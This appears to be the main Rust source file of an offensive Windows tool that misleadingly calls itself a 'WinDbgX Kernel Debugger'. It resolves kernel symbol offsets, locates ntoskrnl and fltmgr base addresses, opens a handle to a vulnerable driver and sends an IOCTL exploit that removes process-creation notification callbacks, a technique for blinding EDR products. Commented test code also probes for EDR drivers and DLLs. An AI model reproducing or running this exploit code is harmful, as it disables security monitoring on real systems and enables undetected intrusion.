use std::{thread, time};

use winapi::ctypes::c_void; 
use winapi::shared::minwindef::{DWORD};     /// Can add LPVOID, etc.
//use winapi::um::handleapi::{CloseHandle};

mod utils;
mod pdb_utils;
mod km_utils;
mod xp_utils;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[+] =-=-=- WinDbgX Kernel Debugger -=-=-=");
    // Sleeping...
    //   - TKTK: do custom sleep that checks for PPID and/or checks for a specific cadence
    println!("[*] Waiting for the opportune moment...\n");
    let bo_do_bleep = time::Duration::from_millis(100);
    thread::sleep(bo_do_bleep);


    // -=-= Doing setup =-=- //

    // Get the Windows version
    println!("[>] Setting up the environment...");
    let version = utils::get_windows_version_simple();
    println!("[|] Detected OS: {}", version);

    // Get symbol files
    let ntos: String = "C:\\Windows\\System32\\ntoskrnl.exe".to_string();
    let fltmgr: String = "C:\\Windows\\System32\\drivers\\fltmgr.sys".to_string();
    
    let nt_url = match pdb_utils::pdb_symbol_url(ntos) {
        Ok(url) => url,
        Err(e) => {
            eprintln!("[!] Failed to get PDB URL for NTOS: {}", e);
            std::process::exit(1);
        }
    };
    let fltmgr_url = match pdb_utils::pdb_symbol_url(fltmgr) {
        Ok(url) => url,
        Err(e) => {
            eprintln!("[!] Failed to get PDB URL for FLTMGR: {}", e);
            std::process::exit(-1);
        }
    };

    println!("[>] Symbols download URLs:");
    println!("[|]   {}", nt_url);
    println!("[|]   {}", fltmgr_url);
    
    // Download symbol files
    let mut nt_pdb = utils::download_pdb(&nt_url)?;
    let fm_pdb = utils::download_pdb(&fltmgr_url)?;

    // Parse symbol files for offsets
    let nt_offsets;
    match pdb_utils::get_nt_offsets(&mut nt_pdb) {
        Ok(offsets) => {
            println!("[+] Got NT offsets for this version...game on :D");
            nt_offsets = offsets; // bind to outer var
        }
        Err(e) => {
            eprintln!("[-] Failed to parse NT offsets: {}", e);
            std::process::exit(-1);
        }
    }

    // Get base addresses for target kernel modules
    let nt_base;
    let fm_base;
    match km_utils::get_driver_base("ntoskrnl.exe") {
        Some(base) => {
            println!("[+] NT base address: {:?}", base);
            nt_base = base;
        },
        None => {
            println!("[!] Could not find base address for ntoskrnl.exe!");
            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
            std::process::exit(-1);
        }
    }
    match km_utils::get_driver_base("fltmgr.sys") {
        Some(base) => {
            println!("[+] FltMgr.sys base address: {:?}", base);
            fm_base = base;
        },
        None => {
            println!("[!] Could not find base address for fltmgr.sys!");
            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
            std::process::exit(-1);
        }
    }


    /* -=-= TESTING: Checking the module base address for driver name + if matching EDR
    let addr: u64 = 0xfffff807200581e0;
    if let Some(driver_name) = km_utils::find_driver_name_from_addr(addr) {
        let is_edr: bool = km_utils::is_driver_name_matching_edr(&driver_name);
        println!("[*] Address 0x{:016x}: {} [EDR? {}]", addr, driver_name, is_edr);   
    }

    // =-=- TESTING: Check the loaded DLLs in a process
    let target_pid: DWORD = 11212;
    if utils::is_edr_dll_loaded(target_pid) {
        println!("[*] EDR DLL detected in process {}", target_pid);
    } else {
        println!("[-] No suspicious EDR DLLs found in process {}", target_pid);
    }
    */
    
    
    // Get a handle to the vuln driver
    let h_drv;
    match xp_utils::get_driver_handle() {
        Ok(handle) => {
            h_drv = handle;
        }
        Err(err) => {
            eprintln!("[-] Could not get handle, error: {}", err);
            std::process::exit(-1);
        }
    }
    println!("[+] Got driver handle: {:?}", h_drv);

    // Remove Process Creation Notification callback
    let process_create_notify_base = {
        (nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)
    };
    println!("[>] PspCreateProcessNotifyRoutine is at: 0x{:16x}", process_create_notify_base);

    println!("[*] Sending exploit to remove process creation notification.");
    unsafe {
        xp_utils::send_ioctl_to_driver(
            h_drv, 
            process_create_notify_base + 0x20,
            0x8
        );
    }



    km_utils::get_thread_info();



    println!("");
    Ok(())
}

